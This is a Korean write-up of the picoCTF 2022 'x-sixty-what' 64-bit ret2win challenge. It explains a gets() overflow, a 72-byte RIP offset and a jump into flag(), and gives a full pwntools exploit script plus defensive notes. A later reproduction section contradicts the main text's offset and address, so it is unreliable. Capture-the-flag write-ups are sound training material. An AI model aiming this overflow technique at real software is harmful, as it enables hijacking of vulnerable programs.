---
title: x-sixty-what — picoCTF 2022 pwn writeup
created: 2026-06-15
updated: 2026-06-16
type: query
tags: [ctf, pwn, stack-overflow, ret2win, x64, nopie, no-canary, picoctf]
sources: [https://ctftime.org/writeup/32813, https://cryptocat.me/blog/ctf/2022/pico/pwn/x_sixty_what/, https://github.com/HHousen/PicoCTF-2022/blob/master/Binary%20Exploitation/x-sixty-what/README.md]
confidence: high
---

# x-sixty-what — picoCTF 2022 pwn writeup

> `x-sixty-what`은 **64-bit 스택 버퍼 오버플로로 RIP를 덮어 `flag()` 함수로 점프하는 picoCTF 2022 Binary Exploitation 문제**입니다. 핵심은 **x64 calling convention, 8바이트 RIP overwrite, 그리고 함수 prologue 회피**입니다.

## 1. 핵심 요약

- 바이너리는 **amd64 64-bit**입니다.
- `gets()`로 입력을 받아 버퍼를 overflow할 수 있습니다.
- 오프셋은 **72 bytes**입니다.
- `flag()` 함수의 시작 주소를 바로 넣으면 `push`/prologue 때문에 세그폴트가 날 수 있어, **두 번째 instruction**으로 점프합니다.

## 2. 문제 구조

| 항목 | 내용 |
|------|------|
| 플랫폼 | picoCTF 2022 |
| 분류 | pwn / stack overflow / ret2win |
| 아키텍처 | amd64 (64-bit) |
| 핵심 요소 | RIP overwrite, no PIE, no canary |
| 오프셋 | 72 |
| 목표 | `flag()` 함수 실행 |

## 3. 공격 흐름

1. `checksec`로 **No PIE / No canary / NX enabled** 상태를 확인합니다.
2. `gdb` 또는 cyclic pattern으로 RIP까지의 오프셋을 찾습니다.
3. `flag()`의 주소를 확인합니다.
4. `flag()`의 첫 instruction이 아니라 **두 번째 instruction**으로 이동합니다.
5. `RIP`를 덮는 payload를 보내면 flag가 출력됩니다.

## 4. 왜 가능한가

이 문제는 64-bit라도 보호가 약합니다. **PIE가 없어서 함수 주소가 고정**되어 있고, **canary도 없어서** 단순한 스택 오버플로만으로 제어 흐름을 바꿀 수 있습니다. 다만 64-bit에서는 리턴 주소와 스택 정렬에 더 주의해야 하며, 함수 프롤로그의 첫 instruction을 건너뛰는 것이 안정적입니다.

## 5. 익스플로잇 예시

```python
from pwn import *  # pwntools를 불러옵니다.

elf = context.binary = ELF('./vuln', checksec=False)  # 바이너리를 로드합니다.

# 로컬/원격 실행 선택용 헬퍼입니다.
def start():
    if args.REMOTE:
        return remote('saturn.picoctf.net', 53403)  # 원격 서비스 예시입니다.
    return process(elf.path)  # 로컬 실행입니다.

io = start()

offset = 72  # RIP까지의 정확한 오프셋입니다.
flag_addr = 0x40123b  # flag()의 두 번째 instruction 주소입니다.

payload = flat(
    b'A' * offset,   # 버퍼를 채웁니다.
    flag_addr        # RIP를 flag() 쪽으로 덮습니다.
)

io.sendlineafter(b':', payload)  # 입력을 보냅니다.
io.interactive()                 # flag 출력 후 상호작용합니다.
```


## 재현 절차

1. 64-bit 바이너리와 스택 정렬 요구를 확인합니다.
```bash
# 아키텍처와 보호기법을 먼저 확인합니다.
file ./vuln              # 예상: ELF 64-bit LSB executable
checksec --file=./vuln    # 예상: NX / PIE / Canary 여부가 출력됩니다.
```
2. 리턴 주소와 스택 정렬을 맞춘 뒤 win으로 이동합니다.
```python
# 64-bit ret2win은 정렬 문제가 자주 있으므로 확인합니다.
from pwn import *
payload = b"A" * 40              # 예시 오프셋입니다.
payload += p64(0x40123a)         # 예시: win() 주소입니다.
print(payload)
```
3. 실행 결과로 flag가 출력되는지 확인합니다.
## 6. 방어 관점 메모

- 64-bit라서 자동으로 안전한 것은 아닙니다.
- `gets()` 같은 위험 함수는 즉시 제거해야 합니다.
- PIE와 canary가 없으면 ret2win이 매우 쉽습니다.
- 함수 시작 주소만 알면 공격 가능하므로, 주소 노출도 함께 막아야 합니다.

## 7. 비교 포인트

- `Stack Cache`는 **stack leak + ret2win형**입니다.
- `x-sixty-what`은 **순수 64-bit ret2win형**입니다.
- `ROPfu`는 **classic ROP syscall형**입니다.
- `Handoff`는 **ret2reg + shellcode형**입니다.

## 8. 참고 자료

- [CTFtime — x-sixty-what / Writeup](https://ctftime.org/writeup/32813)
- [CryptoCat — PicoCTF 2022: X-Sixty-What](https://cryptocat.me/blog/ctf/2022/pico/pwn/x_sixty_what/)
- [HHousen/PicoCTF-2022 — x-sixty-what README](https://github.com/HHousen/PicoCTF-2022/blob/master/Binary%20Exploitation/x-sixty-what/README.md)
- [[ret2win-64bit-stack-alignment-ctf-patterns]]
- [[stack-leak-ret2win-ctf-patterns]]
